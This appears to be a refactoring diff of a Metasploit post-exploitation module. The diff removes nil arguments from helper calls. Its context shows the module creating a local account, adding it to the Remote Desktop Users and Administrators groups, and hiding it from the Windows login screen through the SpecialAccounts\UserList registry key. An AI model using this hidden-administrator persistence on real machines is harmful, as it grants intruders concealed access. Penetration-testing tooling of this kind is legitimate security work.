@@ -139,7 +139,7 @@ class MetasploitModule < Msf::Post
       admin = admin_sid[:name]
 
       user_added = false
-      result = add_user(nil, username, password)
+      result = add_user(username, password)
       if result['return'] == 0
         user_added = true
       elsif check_user(username)
@@ -149,14 +149,14 @@ class MetasploitModule < Msf::Post
       if user_added
         file_local_write(cleanup_rc, "execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
         print_status "\tAdding User: #{username} to local group '#{rdu}'"
-        result = add_members_localgroup(nil, rdu, username)
+        add_members_localgroup(rdu, username)
 
         print_status "\tHiding user from Windows Login screen"
         hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
         registry_setvaldata(hide_user_key, username, 0, "REG_DWORD")
         file_local_write(cleanup_rc, "reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
         print_status "\tAdding User: #{username} to local group '#{admin}'"
-        add_members_localgroup(nil, admin, username)
+        add_members_localgroup(admin, username)
         print_status "You can now login with the created user"
       else
         print_error("Account could not be created")
@@ -171,6 +171,6 @@ class MetasploitModule < Msf::Post
   end
 
   def check_user(user)
-    enum_user().include?(user)
+    enum_user.include?(user)
   end
 end
